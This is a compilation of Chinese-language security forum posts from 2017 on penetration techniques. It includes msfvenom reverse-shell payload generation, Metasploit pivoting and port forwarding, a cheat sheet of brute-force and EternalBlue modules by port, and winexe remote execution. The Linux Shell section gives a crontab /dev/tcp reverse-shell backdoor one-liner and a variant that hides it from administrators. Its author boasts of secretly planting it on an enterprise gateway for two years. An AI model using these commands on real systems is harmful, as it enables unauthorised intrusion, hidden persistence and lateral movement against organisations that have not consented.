# Penetration Testing
子目录:
- [防火墙](#防火墙)
- [webshell扫描](#webshell扫描)
- [域渗透](#域渗透)
- [MSF](#msf)
- [Linux Shell](#linux-shell)
- [PowerShell](#powershell)
- [WSH Injection](#wsh-injection)
- [Downloader](#downloader)
- [Windows COM](#windows-com)
- [Exchange](#exchange)
- [边界设备安全](#边界设备安全)
- [信息收集](#信息收集)


## 防火墙


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-24:


__#姿势#__

  当服务器只开web服务并且防火墙不准服务器对外主动发起链接时，这样来突破！

当我在渗透测试的时候，拿到了web shell可以执行命令时，总想反弹shell出来方便进一步渗透，但是我碰到的环境安全性都做的很好，防火墙策略直接禁止服务器对外发起链接。这样就没法反弹了。

然后我自己有想过突破的方法，我当时想到的是重新封装http的数据包，到服务器后再拆包，转到22端口上去，这样做很复杂，一直没去实现。

今天在freebuf看到这篇文章，就忍不住转过来分享一下，作者在服务器上直接对源端口进行检查，然后将特定的源端口数据通过iptables nat表中PREROUTING 链配合 REDIRECT 重定向到本机22端口去，当时怎么没想到。这个在一些防火墙策略做的很完善的环境下，很有用！

[远程遥控IPTables进行端口复用](http://mp.weixin.qq.com/s/W5npN8YiqG-RBoq2mTv_2g)



---


## webshell扫描

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
使用字典远程扫描webshell，脚本发现疑似webshell后如何更好的进一步自动化甄别与判断。（假设密码已知，webshell包括大小马和一句话）


以前我们做过这个研究，这种远程扫描来准确识别并不容易，对于已知 Webshell，我们可以加精准特征（比如：HTML 里的内容、代码执行的返回内容、特别的文件名等），想通过什么好算法来处理，其实很难。


---

## 域渗透

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
想学习有关域渗透的一些资料，windows域 08/12/WIN10安全检测及bypass，挺说还有linux域，感觉在这方面很欠补，毕竟环境接触的少，网上说的都模棱两可，大多不可行，弄的晕头转向，想权威体质的学习一下


安全技能树里推荐了不少，如果你真想感受，首先得“坏”。


---


## MSF


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#姿势#__

  今天再转篇 FreeBuf 的文章《MSF外网持久控制Android手机并渗透测试局域网》：


[MSF外网持久控制Android手机并渗透测试局域网 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/136574.html)



这个大三学生动手能力不错，哪家相关安全公司需要，可以考虑收了。

年轻人应该多折腾，守正出奇。把握好度就行，一定要把握好度，否则，违法犯罪你迟早跑不掉。

BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 我也看了，感觉好像有办法实验一次，不过有很多点疑问，试试再来请教可好，现在就有个问题，我用dns欺骗在家里能骗局域网内一台机（共8台只能骗一台），在办公室一台都骗不了，一执行还把人弄死你了，大侠请赐教

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 你怎么做dns欺骗的？

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 说到守正出奇，今晚突然想起之前看过的一个贴，[tieba.baidu.com/p/4963716287?see_lz=1&pn=1](tieba.baidu.com/p/4963716287?see_lz=1&pn=1)  这位大兄弟的SE也是六到没谁了

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: kali下用ettercap,,扫描主机经常扫不全，中间人经常无效……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比看看 bettercap

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 所以啊有高手快速指导反馈才能进步，半年前就这个问题折腾的半死，最后都停止玩了，两台电脑一台没问题，一台win10下虚拟机能nat联网，可是不能桥接，网上都查遍了也没解决

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比结果可以再反馈下

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这种远程问就是很难弄明白，各种小问题非常繁琐，每一个小坑都要折腾半死，烦的自己都不好意思一直问

<img src="https://file.xiaomiquan.com/e6/16/e616b63d215ace23913e168c6b8d4f4b20eeab9eb71886ecabb3bd60cd4f07fe.jpg" width="25px"/> __萝卜__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: ettercap跟bettercap都试过 感觉都是时灵时不灵 cos哥有没有更稳定的中间人工具推荐？


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-07:

MSF内网渗透系列-反弹shell

渗透测试时，通过WEB漏洞，拿到了目标网络边缘服务器的webshell，或者通过社工钓鱼，控制了目标办公网络中的一台个人机。

那么结下来就是利用MSF反弹回一个shell，开始在内网扩大我们的战果。

接下来介绍几个基本概念：

payload，又称为攻击载荷。想要返回一个shell，就要在目标机执行我们的payload

正向shell (bind)，需要攻击机主动连接目标端口，如windows/shell/bind_tcp和windows/meterpreter/bind_tcp这两个payload，就会反弹一个正向的shell

反向shell（reverse），目标机会反连接攻击机，如windows/shell/reverse_tcp和windows/meterpreter/reverse_tcp，就会反弹一个反向的shell

meterpreter，Metasploit的一个payload，它具有强大的功能，其具备端口转发和socks代理功能简直就是内网渗透测试神器，windows/meterpreter/reverse_tcp和windows/meterpreter/bind_tcp就会反弹一个meterpreter的shell

在Linux下，那么payload可以选择python/meterpreter/reverse_https

以在window下反弹一个meterpreter的shell为例：

首先利用msfvenom生成我们payload的执行程序：

```
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f exe > ./test.exe
```

在目标机192.168.31.196上执行test.exe，使用exploit/multi/handler模块监听，如图，可以看到返回了一个meterpreter的shell

<img src="https://images.xiaomiquan.com/FvpV6xJty5T8eQVL5x3dvE2DOIXU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:YezmO3MN-DKsGVcqg5bgrhgPzCU=" width="50%" height="50%" align="middle"/>


...


<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 在目标机上执行？你想执行就执行？

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 是的

...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-15:

MSF内网渗透系列-信息收集

对内网进行渗透，首先我们要做好信息收集工作，摸清楚内网环境

总体上来说，内网环境无非两种：域和工作组。当然就只针对域的渗透，我们都可以单独拿出来，做一系列的教程了。

这里我们做无差别处理。下面进入本系列正题，利用MSF进行内网信息收集：

__本地常规信息收集__

Windows：
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows)



Linux: 
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux)



__本地HASH__

meterpreter下利用hashdump从SAM导出密码哈希值

__MSF端口扫描__

利用search portscan查找相关模块。如：auxiliary/scanner/portscan/tcp,我们可以利用该模块扫描同段开3389的机器:

`..msf>use auxiliary/scanner/portscan/tcp`   //选择模块

`..msf>set PORTS 3389`                      //设置端口

`..msf>set RHOSTS 192.168.0.1/24`            //扫描192.168.0.1/24网段内开放3389的主机

__MSF服务扫描__

SMB版本识别：auxiliary/scanner/smb/smb_version  来尝试识别windows的版本

MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433

SSH版本信息：auxiliary/scanner/ssh/ssh_version

FTP版本识别：auxiliary/scanner/ftp/ftp_version

HTTP服务：auxiliary/scanner/http/http_header  我一般用来扫描内网中的WEB服务器，返回相关头信息

图：利用auxiliary/scanner/ssh/ssh_version识别metaslpoitable的ssh版本信息：

<img src="https://images.xiaomiquan.com/FhNBOpcgNqENAJ_T4XpzZc9iDlgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:--muZSfblaIxpdGW_mVD_44gmZs=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-23:

MSF内网渗透系列——穿越边界

前篇系列文章发出以后，很多新接触MSF小伙伴会有疑问:MSF做内网渗透总不能在内网找个机器安装一个MSF吧，这当然是可以的。还有小伙伴想到可以利用proxychain把MSF代理到目标内网，这也没毛病。

下面我就介绍几个MSF自身穿越边界的姿势。

假设我们在VPS上搭建了MSF，已经在目标内网中反弹回了一个meterpreter。那么我们就可以利用这个shell建立一条内网访问通道

情景一：利用MSF扫描目标内网smb_version

pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到目标内网环境

sessions一下看看我们shell的信息：如下

```。。
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > sessions
。
。Active sessions
。===============
。
。  Id  Type                      Information  Connection
。  --  ----                      -----------  ----------
。  1   meterpreter python/linux  user @ test  8.8.8.8:443 -> 101.101.101.101:35272 (10.10.10.10)
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

我们发现session的ID为1，内网ip为10.10.10.10

那么就可以在metasploit添加一个路由表，目的是访问10.10.10.11将通过meterpreter的session 1 来访问，如下：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > route add 10.10.10.11 255.255.255.255 1  //route add  目标i或ip段  掩码  session的ID
。
。[*] Route added
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

然后我们就可以：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > use auxiliary/scanner/smb/smb_version
。
。msf auxiliary(smb_version) > set rhosts 10.10.10.11  //如果想扫面整个C段 set rhosts 10.10.10.11/24
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

如果我们想让其他一些工具（如：Nmap）利用该路由表到目标内网搞事情呢？

这里MSF的socks4a模块就可以提供一个监听隧道供其他应用程序访问：auxiliary/server/socks4a

情景二：访问目标内网一个服务器（10.10.10.12）80端口的web应用

我们可以利用meterpreter的portfwd把内网web服务器的80端口转发到我们VPS(8.8.8.8)的8088端口。然后我们就可以通过
[http://8.8.8.8:8088/](http://8.8.8.8:8088/)

访问
[http://10.10.10.12:80](http://10.10.10.12:80)



首先session -i 1进入meterpreter，然后做端口转发，如下：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf auxiliary(smb_version) > sessions -i 1
。[*] Starting interaction with 1...
。
。meterpreter > portfwd add -l 8088 -r 192.168.31.169 -p 80
。[*] Local TCP relay created: :8088 <-> 192.168.31.169:80
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

后记：在整理这篇文章的时候，就想着出个番外篇，专门整理一下其他穿越边界的各种姿势


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#姿势#__

免杀 MSF Windows Payload 的方法与实践

原创@Moriarty  

MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。

继续阅读：


[免杀 MSF Windows Payload 的方法与实践](http://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA)



<img src="https://images.xiaomiquan.com/FuAF4GxXRaqAg4xPxw8Ia9qPfJL2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o4C2jrRosZz9Ju69zxh2K9pp7q4=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-27:

MSF内网渗透系列——端口渗透

不多说了，端口检测备忘录，整理常用端口对应MSF的相关模块。欢迎补充

port：21 （FTP）
```
auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破
其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell内网常见
```

port:22  (SSH)
```
auxiliary/scanner/ssh/ssh_login    //SSH登陆爆破
其它：search SSH
```

port:23  (telnet)
```
auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备
```

port:80，8080，443 (附：web服务常见端口整理，见图)
```
http服务，内网开放的web服务安全性往往比较差，注入，弱口令...web渗透在内网依然重要
```

port:445 (简直无需多说的端口）
```
exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜
exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝
auxiliary/scanner/smb/smb_login             //SMB登陆爆破
其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用
```

port:3389   (远程桌面RDP)
```
auxiliary/scanner/rdp/ms12_020_check 
```

5900  (VNC)
```
auxiliary/scanner/vnc/vnc_none_auth
auxiliary/scanner/vnc/vnc_login
exploit/multi/vnc/vnc_keyboard_exec
```

数据库：

port:1433  （Sqlserver）
```
use auxiliary/scanner/mssql/mssql_login   //sa爆破
```

port:3306   (Mysql)
```
auxiliary/scanner/mysql/mysql_login
```

port: 27017、27018 (Mongodb)
```
auxiliary/scanner/mongodb/mongodb_login
```

port:6379  （Redis）
```
auxiliary/scanner/redis/redis_login
auxiliary/scanner/redis/file_upload
```

port:1521   (Oracle)
```
search Oracle
```

port:5432   (PostgreSQL)
```
search PostgreSQL
```

<img src="https://images.xiaomiquan.com/FmgaMfoaZoU0EwdMgVnjSM93Sdeo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:vQF74cjllAa2OqTa3lpWOz4oFS8=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e4/b4/e4b46552510c6ae0660244095fca260401a18af22f2746c0aeeae86e99b6abb8.jpg" width="25px"/> __罗钦__: 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899


...

---

## Linux Shell


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:


__#姿势#__

一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
我觉得很实用且强大,分享给大家.

```
(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
```

就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。


<详解>

`/dev/tcp/IP/port`  ：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。

`exec 9<>`  ：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9<> ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。

`exec 0<&9`  :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.

`exec 1>9&`  : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。

`2>&1`   :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。

`/bin/bash --noprofile -i`  :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。


前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。

当然管理员通过crontab -l 可以查看到任务，

不过你这样：

```
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -  
```

猥琐版直接显示你用户名下没有任务....

在未连接状态启动反连任务的时候，进程和端口都无状态。



...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: ****是什么

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 要不百度下crontab的用法？ 是设置时间用的，依次排序下去就是设置 分 时 日 月 周 ，*如果在日这个单位上，就是不限制在每月哪号。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 了解了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 6666   定时反弹shell这是，同时问下 linux想转发另外一台的3389出来，有什么好办法，用iptable做nat转发失败

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 参考下之前弦哥发的，ssh端口转发实战，应该可以解决你的问题。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下：这个指令来自猪猪侠

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 下午在centos和kali上测试都显示9是Bad file descriptor

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你没开监听就会这样，试着先开监听

<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__: kali里面直接在命令行里可以反弹拿到shell，但是在crontab里面无法拿shell，求解


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-06:

> dusts 提问：
root shell拿到了,然后msf里用 shell to meterpreter 模块，也总是执行成功，但是就是不能返回 meterpreter  sessions -l永远只是个shell  是什么原因？  有解吗？


linux下root shell那么强大，还要meterpreter shell干嘛，有时候msf加载的模块是会不稳定，如果一定要meterpreter shell，可以手工生成后门执行一下



...

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 想拷贝文件，但是没有nc , 没有能做交互式shell的python，用什么传

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 只是传文件就太多方法了，scp ftp 这些比较简单，对方至少是有scp的，或者wget 你的其它后门进去

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个问题也挺模糊的，该上调试了，看看相关日志

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互式的ftp怎么连法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 有没有非交互式shell下的操作指南，针对很多需要交互的命令的 非交互写法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，msf调试模块没找到。。shell下会打印一堆乱码，可能是antivirus 的缘故

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: echo是可以。但是碰到ftp不支持-s 文件输入

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互的scp怎么传密码进去，看了下参数没有，  要生成密钥对吗？如果密钥对的话简单的生成方法？

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ssh keygen 生成密钥对后，公钥存放位置不明，不同版本密钥保存位置不一样，有点繁琐，有没有直接传密码的非交互方式

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: echo 个ftp 的脚本，自动下载呢？


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-12:

内网渗透系列番外篇——winexe

在渗透测试时，如何直接通过一台linux主机去控制一台windows主机。在这里给大家推荐一个工具：winexe,KALI下自带。

winexe可以从Linux上远程执行windows命令（SMB）。用法也很简单,如下：

```
./winexe --system -U 'Administrator%123123' //192.168.31.165 'cmd.exe /c whoami'
```

成功执行即可返回whoami的结果。

-U参数用来指定凭据： `-U=[DOMAIN/]USERNAME[%PASSWORD]`

--system参数，使用system权限来执行命令

条件允许的话：可以直接`./winexe -U 'Administrator%123123' //192.168.31.165 'cmd.exe'` 返回一个交互式CMD,如图。

工具介绍：
[https://tools.kali.org/maintaining-access/winexe](https://tools.kali.org/maintaining-access/winexe)



下载地址：
[Winexe / current / [b787d2]](https://sourceforge.net/p/winexe/winexe-waf/ci/master/tree/)



kali上的winexe（/usr/bin/winexe）采用的是动态编译，在运行的时候需要同时提供用到的dll/so文件。我们需要静态编译让它独立运行。不管linux主机的权限大小，都可以进行利用。

<img src="https://images.xiaomiquan.com/FgNlxTgx-Cb5t0PQOO66yoDQannq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dmASdZsa2Mvdj38P6y19JANVbGk=" width="50%" height="50%" align="middle"/>


---


## Powershell

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:


__#姿势#__

 Increased use of PowerShell in attacks

推荐这篇来自赛门铁克的 Paper，这是一篇难得攻防介绍很全面的研究成果，从 PowerShell 基础到各攻击阶段的姿势：

执行策略

植入
- 如：Email、Office 宏、Exploit Kits、横向渗透、策略文件、任务计划、PsExec、等

持久化
- 如：注册表、WMI、任务计划、启动目录、组策略、策略文件、等

混淆
- 如：大小写、空格、Get-自动补全、System.自动补全、引号拼接、反单引魔法、通配符魔法、别名、向后兼容、进制转换、-f格式化、XOR、BrainFuck、等

一些绕过技巧

在列举这些攻击过程的同时还举例了一些经典木马的案例，最后还好些篇幅介绍了防御姿势。

这篇 Paper 是去年的，如果能通读下来并做些实践，会很受益。

